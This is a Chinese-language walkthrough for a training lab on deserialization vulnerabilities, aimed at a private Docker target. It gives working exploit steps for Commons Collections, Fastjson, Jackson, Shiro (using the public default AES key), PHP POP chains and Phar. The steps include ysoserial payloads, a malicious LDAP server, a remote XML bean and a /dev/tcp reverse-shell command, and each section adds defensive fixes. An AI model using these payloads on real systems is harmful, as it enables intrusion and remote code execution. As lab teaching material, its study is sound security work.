# 反序列化漏洞靶场 - 新手通关手册

> **目标地址**: 192.168.124.130  
> **部署方式**: Docker 容器 (vuln-frontend / vuln-java / vuln-php / vuln-mysql)  
> **用户**: test / **OS**: Ubuntu 24.04  
> **用途**: 网络安全教育研究 — 严禁非法使用  

---

## 目录

| # | 章节 | 难度 |
|---|------|------|
| 0 | 靶场介绍与环境信息 | - |
| 1 | Java 原生反序列化漏洞 (Apache Commons Collections 3.1) | 中 |
| 2 | Fastjson 反序列化漏洞 (1.2.24 JNDI 注入) | 中高 |
| 3 | Jackson 反序列化漏洞 (CVE-2017-7525) | 高 |
| 4 | Shiro 反序列化漏洞 (CVE-2016-4437) | 中高 |
| 5 | PHP 反序列化 POP 链 | 中 |
| 6 | PHP Phar 反序列化漏洞 | 中 |
| A | 工具安装与环境准备 | - |

---

## 0. 靶场介绍与环境信息

### 0.1 环境架构

```
┌────────────────────────────────────────────────────────────────────────┐
│                      192.168.124.130 (Ubuntu 24.04 Host)               │
│                                                                        │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │  Docker Compose Stack                                             │  │
│  │                                                                   │  │
│  │  ┌─────────────┐  ┌─────────────┐  ┌──────────┐  ┌───────────┐  │  │
│  │  │ vuln-       │  │ vuln-       │  │ vuln-    │  │ vuln-     │  │  │
│  │  │ frontend    │  │ java        │  │ php      │  │ mysql     │  │  │
│  │  │ (Nginx)     │  │ (Tomcat)    │  │ (Apache) │  │           │  │  │
│  │  │ :1008       │  │ :18080      │  │ :18081   │  │ :13306    │  │  │
│  │  └──────┬──────┘  └──────┬──────┘  └────┬─────┘  └───────────┘  │  │
│  │         │                │              │                        │  │
│  └─────────┼────────────────┼──────────────┼────────────────────────┘  │
│            │                │              │                            │
│  浏览器访问入口    Java 漏洞服务    PHP 漏洞服务                            │
└────────────────────────────────────────────────────────────────────────┘
```

### 0.2 端口说明

| 端口 | 服务 | 用途 |
|------|------|------|
| 22 | SSH | 远程管理 |
| **1008** | Nginx 前端 | **主页入口** |
| **18080** | Java (Tomcat + Spring Boot) | Java 漏洞场景 (vuln1-vuln4) |
| **18081** | PHP (PHP 7.4 + Apache) | PHP 漏洞场景 (vuln5-vuln6) |
| 13306 | MySQL | 后端数据库 |
| 8888 | 管理面板 | phpMyAdmin |

### 0.3 技术栈

| 组件 | 版本 | 说明 |
|------|------|------|
| Spring Boot | 2.3.7.RELEASE | Java 框架 |
| Apache Commons Collections | **3.1** | 漏洞 gadget |
| Fastjson | **1.2.24** | 漏洞组件 |
| Jackson | 2.11.3 / **2.9.8** | vuln3 使用 2.9.8 |
| Apache Shiro | **1.2.4** | 漏洞组件 |
| PHP | **7.4** | PHP 运行环境 |
| MySQL | 8.0 | 数据库 |
| Nginx | 1.29.7 | 反向代理 |

### 0.4 快捷信息

- 主页: `http://192.168.124.130:1008/`
- Java 入口: `http://192.168.124.130:18080/vuln{1-4}/`
- PHP 入口: `http://192.168.124.130:18081/vuln{5-6}.php`
- Docker 容器名: `vuln-frontend`、`vuln-java`、`vuln-php`、`vuln-mysql`

---

## 1. Java 原生反序列化漏洞

### 1.1 漏洞原理

**Apache Commons Collections 3.1** 提供了一个特殊的 `InvokerTransformer` 类，可以通过反射调用任意方法。当程序使用 `ObjectInputStream.readObject()` 对不受信任的数据进行反序列化时，攻击者可以构造恶意的 gadget chain：

```
恶意数据 → readObject() → InvokerTransformer.transform()
→ Method.invoke(Runtime.getRuntime(), "exec", "命令")
→ Runtime.exec("命令") → RCE
```

核心触发链：
```
BadAttributeValueExpException.readObject()
  → TiedMapEntry.toString()
    → LazyMap.get()
      → ChainedTransformer.transform()
        → InvokerTransformer.transform()
          → Runtime.getRuntime().exec("命令")
```

### 1.2 环境验证

1. 访问浏览器：`http://192.168.124.130:18080/vuln1/`
2. 确认看到 "Java原生反序列化漏洞" 页面
3. 验证 API 端点：
```bash
curl -X POST http://192.168.124.130:18080/vuln1/deserialize \
  -H "Content-Type: application/json" \
  -d 'dGVzdA=='
# 预期：反序列化成功 或 反序列化失败 (取决于输入)
```

### 1.3 利用方法

#### 步骤 1: 使用 ysoserial 生成 payload

```bash
# 安装 Java JDK (如果未安装)
# 下载 ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# 生成 CommonsCollections1 gadget
java -jar ysoserial-all.jar CommonsCollections1 "touch /tmp/pwned" | base64 -w 0
```

#### 步骤 2: 发送 payload

```bash
# 方法 A: 直接 curl
PAYLOAD=$(java -jar ysoserial-all.jar CommonsCollections1 "touch /tmp/pwned" | base64 -w 0)
curl -X POST http://192.168.124.130:18080/vuln1/deserialize \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"

# 方法 B: 使用 Python 生成 Python 可运行的 payload（适合本题环境）
python3 -c "
import subprocess, base64
result = subprocess.run(
    ['java', '-jar', 'ysoserial-all.jar', 'CommonsCollections1', 'touch /tmp/pwned_v1'],
    capture_output=True
)
payload = base64.b64encode(result.stdout).decode()
print(payload)
"
# 将上面输出的 base64 字符串通过网页或 curl 提交
```

#### 步骤 3: 反弹 Shell（进阶）

```bash
# 1. 先监听
nc -lvnp 4444

# 2. 生成反弹 shell payload
PAYLOAD=$(java -jar ysoserial-all.jar CommonsCollections1 \
  "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" | base64 -w 0)
curl -X POST http://192.168.124.130:18080/vuln1/deserialize \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"
```

### 1.4 攻击效果验证

成功执行后，验证：

```bash
# SSH 到靶场检查
ssh test@192.168.124.130
docker exec -it vuln-java ls -la /tmp/pwned
# 预期: -rw-r--r-- 1 root root 0 ... /tmp/pwned
```

### 1.5 防御修复建议

```java
// 1. 反序列化时使用白名单限制
ObjectInputStream ois = new ObjectInputStream(bis) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) 
        throws ClassNotFoundException {
        if (!isAllowed(desc.getName())) {
            throw new InvalidClassException("Unauthorized class");
        }
        return super.resolveClass(desc);
    }
};

// 2. 升级 Apache Commons Collections
// commons-collections:commons-collections:3.2.2 或更高
// 3. 使用 commons-collections4 替换 3.x
```

---

## 2. Fastjson 反序列化漏洞

### 2.1 漏洞原理

**Fastjson 1.2.24** 及以下版本中，`JSON.parseObject()` 在处理 JSON 时，如果遇到 `@type` 字段，会根据指定类名创建对象实例。攻击者可以通过指定危险类（如 `com.sun.rowset.JdbcRowSetImpl`）触发 JNDI 注入：

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil/Exploit","autoCommit":true}
→ 实例化 JdbcRowSetImpl
→ 连接恶意 LDAP 服务器
→ 加载远程恶意类
→ RCE
```

### 2.2 环境验证

1. 访问：`http://192.168.124.130:18080/vuln2/`
2. 测试正常解析：
```bash
curl -X POST http://192.168.124.130:18080/vuln2/parse \
  -H "Content-Type: application/json" \
  -d '{"name":"test","value":"hello"}'
# 预期: JSON解析成功！对象:{"name":"test","value":"hello"}
```

### 2.3 利用方法

#### 步骤 1: 启动恶意 LDAP 服务

```bash
# 下载 JNDI-Injection-Exploit
wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/latest/download/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

# 启动 LDAP 服务（替换 YOUR_IP 为本机 IP）
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch /tmp/pwned_fastjson" -A YOUR_IP
```

#### 步骤 2: 发送恶意 JSON

```bash
# 方法 A: 直接提交（如果能联网）
curl -X POST http://192.168.124.130:18080/vuln2/parse \
  -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://YOUR_IP:1389/Exploit","autoCommit":true}'

# 方法 B: 使用 TemplatesImpl（不需要出站网络）
# 先用 marshalsec 生成 payload
# 或利用 Bcel 编码:
{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader","val":"$$BCEL$$$..."}
```

#### 步骤 3: 无外网利用（TemplatesImpl）

```python
# Python 脚本生成 TemplatesImpl payload
import subprocess, base64, os

# 先编译恶意 Java 类
malicious_java = '''
import java.io.*;
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("touch /tmp/pwned_fastjson2");
        } catch(Exception e) {}
    }
}
'''
with open("Exploit.java", "w") as f:
    f.write(malicious_java)

# 编译并生成 payload (需要 ysoserial 配合)
# java -jar ysoserial-all.jar TemplatesExploit "touch /tmp/pwned_fastjson2"
```

### 2.4 攻击效果验证

```bash
ssh test@192.168.124.130
docker exec -it vuln-java cat /etc/passwd | head
# 或
docker exec -it vuln-java ls /tmp/pwned_fastjson 2>/dev/null && echo "RCE SUCCESS"
```

### 2.5 防御修复建议

```java
// 1. 升级 Fastjson 到最新版 (≥ 2.0.24) 或指定安全版本 (1.2.83+)
// 反序列化前开启安全模式:
ParserConfig.getGlobalInstance().setSafeMode(true);

// 2. 禁用 @type 功能
JSON.parseObject(jsonData, Object.class, Feature.SupportAutoType /* 为 false */);

// 3. 升级到 Fastjson2
// com.alibaba.fastjson2:fastjson2
```

---

## 3. Jackson 反序列化漏洞 (CVE-2017-7525)

### 3.1 漏洞原理

**Jackson 2.9.x** 在启用 `enableDefaultTyping()` 后，会在 JSON 中嵌入类类型信息，通过多态类型处理来实例化对象。当 classpath 下存在 `org.springframework.context.support.ClassPathXmlApplicationContext` 等危险类时：

```
["org.springframework.context.support.ClassPathXmlApplicationContext", "http://evil/poc.xml"]
→ Jackson 实例化 ClassPathXmlApplicationContext
→ 加载远程 XML 配置文件
→ XML 中定义 bean 调用 Runtime.exec()
→ RCE
```

本靶场 vuln3 为模拟教学用例，展示了漏洞触发条件。

### 3.2 环境验证

1. 访问：`http://192.168.124.130:18080/vuln3/`
2. 确认看到 "Jackson反序列化漏洞" 页面
```bash
curl http://192.168.124.130:18080/vuln3/data?data=test
# 预期: Jackson反序列化功能暂时禁用 (因为缺少完整配置)
```

### 3.3 利用方法

> 环境提示：本靶场 vuln3 为教学演示页面，需要额外配置 Jackson databind 才能完整利用。

#### 步骤 1: 搭建远程 HTTP 服务器（用于提供 poc.xml）

```bash
# 创建恶意 XML 配置
cat > /tmp/poc.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="evil" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>touch</value>
                <value>/tmp/pwned_jackson</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
EOF

# 启动 HTTP 服务
cd /tmp && python3 -m http.server 9999 &
```

#### 步骤 2: 发送 payload

```bash
# 通过 POST 提交
curl -X POST http://192.168.124.130:18080/vuln3/deserialize \
  -H "Content-Type: application/json" \
  -d '["org.springframework.context.support.ClassPathXmlApplicationContext", "http://YOUR_IP:9999/poc.xml"]'

# 或通过网页表单输入:
# ["org.springframework.context.support.ClassPathXmlApplicationContext", "http://YOUR_IP:9999/poc.xml"]
```

### 3.4 攻击效果验证

```bash
ssh test@192.168.124.130
docker exec -it vuln-java ls /tmp/pwned_jackson
```

### 3.5 防御修复建议

```java
// 1. 不要使用 enableDefaultTyping
// Object mapper = new ObjectMapper();
// 移除 mapper.activateDefaultTyping() 调用

// 2. 升级到 Jackson 2.9.9.2+ 或 2.10.x
// jackson-databind-2.9.9.2.jar 已修复本漏洞

// 3. 使用 @JsonTypeInfo 配合 @JsonSubTypes 进行受控多态
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = SafeClass.class, name = "safe")
})
```

---

## 4. Shiro 反序列化漏洞 (CVE-2016-4437)

### 4.1 漏洞原理

**Apache Shiro 1.2.4** 的 RememberMe 功能使用 AES-128-CBC 加密序列化数据。其默认密钥 `kPH+bIxk5D2deZiIxcaaaA==` 已在源码中公开：

```
Cookie rememberMe = AES_CBC(序列化(用户对象), key=kPH+bIxk5D2deZiIxcaaaA==)
→ 攻击者用公开的密钥加密恶意序列化对象
→ Shiro 解密后 readObject()
→ 走 Commons Collections gadget → RCE
```

### 4.2 环境验证

1. 访问：`http://192.168.124.130:18080/vuln4/`
2. 使用默认账号登录：
```bash
curl -X POST -c /tmp/shiro_cookies.txt \
  "http://192.168.124.130:18080/vuln4/login?username=admin&password=admin123"
# 预期: 登录成功！RememberMe cookie 已设置
```
3. 查看返回的 Cookie 中的 rememberMe 值

### 4.3 利用方法

#### 步骤 1: 使用 shiro_attack 工具

```bash
# 下载工具（需要 Java）
git clone https://github.com/wuppp/shiro_attack_2.2.git
cd shiro_attack_2.2

# 或使用命令行
java -jar shiro_exp.jar "http://192.168.124.130:18080/vuln4/" \
  "kPH+bIxk5D2deZiIxcaaaA=="
```

#### 步骤 2: 使用 ysoserial 生成 payload

```bash
# 格式: AES(CBC, key, iv) + Base64
# Key: kPH+bIxk5D2deZiIxcaaaA== (Base64 解码为 16 字节)
# IV: 通常与 key 相同

python3 << 'PYEOF'
import subprocess, base64, os
from Crypto.Cipher import AES

# 生成 payload
result = subprocess.run(
    ['java', '-jar', 'ysoserial-all.jar', 'CommonsCollections2', 'touch /tmp/pwned_shiro'],
    capture_output=True
)
payload_bytes = result.stdout

# Shiro 默认配置
key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
iv = key  # Shiro 1.2.4 使用 key 作为 IV

# AES-CBC 加密
cipher = AES.new(key, AES.MODE_CBC, iv)
pad_len = 16 - len(payload_bytes) % 16
padded = payload_bytes + bytes([pad_len]) * pad_len
encrypted = cipher.encrypt(padded)

# Shiro 格式: base64(iv + ciphertext)
shiro_payload = base64.b64encode(iv + encrypted).decode()
print(shiro_payload)
PYEOF
```

#### 步骤 3: 发送恶意 Cookie

```bash
# 获取如上输出的 payload，通过 cookie 提交
curl -b "rememberMe=<PAYLOAD>" http://192.168.124.130:18080/vuln4/check

# 或通过浏览器开发者工具手动设置 Cookie:
# rememberMe = <上面的 base64 值>
# 然后访问 /vuln4/check 检查是否执行成功
```

### 4.4 攻击效果验证

```bash
ssh test@192.168.124.130
docker exec -it vuln-java ls /tmp/pwned_shiro
```

### 4.5 防御修复建议

```java
// 1. 升级 Apache Shiro 到 ≥ 1.7.0 或 1.2.5+
// 2. 重置 AES 密钥：生成随机 16 字节密钥，不要使用默认值
// shiro.ini:
// securityManager.rememberMeManager.cipherKey = <BASE64_随机密钥>

// 3. 禁用 RememberMe 功能（如果不需要）
// 4. 配置 rememberMe cookie 为 HttpOnly + Secure

// 示例生成新密钥:
// KeyGenerator keyGen = KeyGenerator.getInstance("AES");
// keyGen.init(128);
// SecretKey key = keyGen.generateKey();
// System.out.println(Base64.getEncoder().encodeToString(key.getEncoded()));
```

---

## 5. PHP 反序列化 POP 链

### 5.1 漏洞原理

**PHP 反序列化 POP 链 (Property-Oriented Programming)** 利用 PHP 的魔术方法（Magic Methods）在反序列化时自动触发的特性，将多个类串联起来实现远程代码执行。

核心魔术方法：
- `__destruct()` — 对象销毁时触发
- `__wakeup()` — `unserialize()` 时优先触发
- `__toString()` — 对象被当作字符串时触发
- `__invoke()` — 对象被当作函数调用时触发

利用链示例：
```
Logger::__destruct()
  → CommandExecutor::__invoke()
    → system("touch /tmp/pwned")
```

### 5.2 环境验证

1. 访问：`http://192.168.124.130:18081/vuln5.php`
2. 测试正常反序列化：
```bash
# 序列化无害对象测试
TEST=$(php -r "echo base64_encode(serialize(array('test'=>'hello')));")
curl -X POST http://192.168.124.130:18081/vuln5.php \
  --data-urlencode "data=$TEST"
```

### 5.3 利用方法

#### 步骤 1: 构造 PHP 利用脚本

创建并运行以下 PHP 脚本：

```php
<?php
// vuln5_exploit.php - 运行后输出 base64-encoded 的 serialized payload
class CommandExecutor {
    private $command = "touch /tmp/pwned_php";
    private $args = array();
}

class Logger {
    private $logFile = "/tmp/exploit_log.txt";
    private $callback;

    public function __construct() {
        $this->callback = new CommandExecutor();
    }
}

$obj = new Logger();
echo base64_encode(serialize($obj));
?>
```

#### 步骤 2: 生成并提交 payload

```bash
# 本地运行 PHP 脚本
PAYLOAD=$(php vuln5_exploit.php)
echo "Payload: $PAYLOAD"

# 提交到靶机
curl -X POST http://192.168.124.130:18081/vuln5.php \
  --data-urlencode "data=$PAYLOAD"
```

#### 步骤 3: 进阶 — 通过 Vuln5POPChain 类

靶场代码中还提供了 `Vuln5POPChain` 类，它通过 `__destruct()` 和 `$admin` 属性结合 `$_POST['admin_cmd']` 实现 RCE：

```php
<?php
// 绕过 __wakeup 后触发 __destruct
// 使用 CVE-2016-7124: 修改属性数量绕过 __wakeup

class Vuln5POPChain {
    private $user;
    private $admin = true;  // 改为 true
}

$obj = new Vuln5POPChain("attacker");
$serialized = serialize($obj);
// 将属性数量从 2 改为 3 (绕过 __wakeup)
$serialized = str_replace(':"Vuln5POPChain":2:', ':"Vuln5POPChain":3:', $serialized);
echo base64_encode($serialized);
?>
```

提交时同时通过 POST 传递命令：
```bash
# 同时发送 data 和 admin_cmd
curl -X POST http://192.168.124.130:18081/vuln5.php \
  --data-urlencode "data=$PAYLOAD" \
  --data-urlencode "admin_cmd=id"
```

### 5.4 攻击效果验证

```bash
ssh test@192.168.124.130
docker exec -it vuln-php ls /tmp/pwned_php
# 预期: -rw-r--r-- 1 www-data www-data ... /tmp/pwned_php
```

### 5.5 防御修复建议

```php
<?php
// 1. 在 unserialize 时禁用类对象
$data = unserialize($input, ['allowed_classes' => false]);

// 2. 使用 JSON 替代序列化进行数据传输
$data = json_decode($input, true);  // 安全替代方案

// 3. 在魔术方法中添加安全检查
public function __wakeup() {
    // 强制重置敏感属性
    $this->admin = false;
    $this->callback = null;
    throw new Exception("Deserialization not allowed");
}

// 4. 升级到 PHP 8.x (部分缓解, 但不是完全修复)
```

---

## 6. PHP Phar 反序列化漏洞

### 6.1 漏洞原理

**Phar (PHP Archive)** 是 PHP 的分发包格式，类似于 Java 的 JAR。Phar 文件中包含一个 `metadata` 元数据字段，该字段是**序列化存储**的。当使用任何 PHP 文件操作函数（`file_exists`、`is_file`、`file_get_contents` 等）访问 (`phar://` 协议) 一个 Phar 文件时，PHP 会自动反序列化其元数据：

```
恶意 Phar 文件: meta-data = serialize(CommandExecutor)
→ 上传到服务器
→ file_exists("phar://pwn.phar/test.txt") 或 fopen()
→ 自动反序列化 metadata
→ CommandExecutor 的魔术方法触发
→ RCE
```

**关键点**: 不需要调用 `unserialize()`，文件操作函数即可触发。

### 6.2 环境验证

1. 访问：`http://192.168.124.130:18081/vuln6.php`
2. 确认看到文件上传检测界面
3. 检查 Phar 支持：
```bash
php -i | grep -i "phar"
# 预期: phar.readonly = Off (靶场需要关闭才能生成)
```

### 6.3 利用方法

> ⚠️ **前置条件**: 本靶场需关闭 `phar.readonly`（生产环境默认开启以阻止生成 Phar）  
> 靶场 PHP Dockerfile 已配置 `phar.readonly = Off`

#### 步骤 1: 生成恶意 Phar 文件

```php
<?php
// gen_phar.php - 生成恶意 Phar
@unlink('poc.phar');

class CommandExecutor {
    private $command = "touch /tmp/pwned_phar";
}

$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');  // 伪造 GIF 头
$phar->addFromString('test.txt', 'whatever');
$phar->setMetadata(new CommandExecutor());
$phar->stopBuffering();

echo "poc.phar created, size: " . filesize('poc.phar') . " bytes\n";
?>
```

```bash
# 运行
php gen_phar.php
# 验证 Phar 内包含序列化数据
php -r "echo file_get_contents('phar://poc.phar/test.txt');"
```

#### 步骤 2: 上传到靶场

```bash
# 通过 curl 上传
curl -X POST http://192.168.124.130:18081/vuln6.php \
  -F "phar_file=@poc.phar;type=image/gif"
```

注意靶场代码关键点：
- 上传后使用 `finfo` 检测 MIME 类型
- 使用 `PharDeserialization` 类包装文件名
- `PharDeserialization::__destruct()` 中调用 `new Phar()` 触发反序列化

#### 步骤 3: 构造特定路径的 Phar

如果文件名被重命名，可以使用相对路径：
```php
$phar = new Phar('poc.phar');
$phar->setMetadata(new CommandExecutor());
// 上传后 PharDeserialization 会读取 phar://uploads/something.phar
```

### 6.4 攻击效果验证

```bash
ssh test@192.168.124.130
docker exec -it vuln-php ls /tmp/pwned_phar
# 预期: 文件存在
```

### 6.5 防御修复建议

```php
<?php
// 1. 在 php.ini 中禁用 Phar 写入
// phar.readonly = On  (默认)

// 2. 使用 PHPGGC 生成 payload 时确保 Phar.readonly=Off
// 在生产环境中保持 On 即可防止生成

// 3. 反序列化前检查文件类型
// 使用 finfo_file 检测 MIME，并在反序列化前过滤

// 4. 在 Phar 反序列化入口添加白名单
// 特别提防 phar:// 协议的调用

// 5. 文件上传后随机重命名，避免 Phar 后缀
$filename = bin2hex(random_bytes(16)) . '.dat';
```

---

## A. 工具安装与环境准备

### A.1 推荐工具清单

| 工具 | 用途 | 安装 |
|------|------|------|
| **ysoserial** | Java 反序列化 payload 生成 | `wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar` |
| **JNDI-Injection-Exploit** | Fastjson JNDI 注入 | `wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/latest/download/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar` |
| **marshalsec** | JNDI LDAP/RMI 服务 | `git clone https://github.com/mbechler/marshalsec && mvn package` |
| **PHPGGC** | PHP 反序列化 payload 生成 | `git clone https://github.com/ambionics/phpggc` |
| **Burp Suite** | 拦截和重放 HTTP 请求 | PortSwigger 官方下载 |
| **curl** | 命令行 HTTP 请求 | 系统自带 |
| **nc** | 监听反弹 Shell | `apt install netcat` |

### A.2 快速安装脚本

```bash
# 创建工具目录
mkdir ~/lab_tools && cd ~/lab_tools

# 安装 JDK (ysoserial / JNDI 需要)
apt update && apt install -y default-jdk-headless

# 安装 PHP CLI (用于 local payload 生成)
apt install -y php-cli php-curl

# 安装 Python 依赖
pip3 install pycryptodome paramiko requests

# 下载 ysoserial
wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# 下载 JNDI-Injection-Exploit
wget -q https://github.com/welk1n/JNDI-Injection-Exploit/releases/latest/download/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

# 验证
java -jar ysoserial-all.jar --help
php --version
python3 --version
```

### A.3 验证实验连通性

```bash
# 验证主页
curl -s http://192.168.124.130:1008/ | head -5

# 验证 Java 服务
curl -s http://192.168.124.130:18080/vuln1/ | grep title
curl -s http://192.168.124.130:18080/vuln2/ | grep title
curl -s http://192.168.124.130:18080/vuln3/ | grep title
curl -s http://192.168.124.130:18080/vuln4/ | grep title

# 验证 PHP 服务
curl -s http://192.168.124.130:18081/vuln5.php | grep title
curl -s http://192.168.124.130:18081/vuln6.php | grep title

# 验证 Docker 容器
ssh test@192.168.124.130 "docker ps"
```

---

## 快速排查索引

| 问题 | 排查 |
|------|------|
| `Connection refused` | 检查 Docker 容器是否运行: `docker ps` |
| `500 Internal Server Error` | 检查 Java 应用日志: `docker logs vuln-java` |
| `403 Forbidden` | 检查 nginx 配置和路由规则 |
| ysoserial 报 `ClassNotFoundException` | 确认 jar 路径正确，Java 版本匹配 |
| LDAP/RMI 不回调 | 检查网络隔离、出站端口、IP 可达性 |
| Phar 生成失败 | 确认 `phar.readonly = Off` |

---

## 安全声明

本靶场仅供**网络安全教育研究和教学培训**使用。所有漏洞场景均在隔离的 Docker 容器环境中运行。严禁将本靶场中的任何漏洞利用技术用于未经授权的系统。请在法律法规允许的范围内进行学习和研究。

---

> **最后更新**: 2026-09-07  
> **作者**: 靶场教学文档工程师  
> **版本**: v1.0  
> **适用靶场版本**: 反序列化漏洞靶场 v1.0 (基于 192.168.124.130)
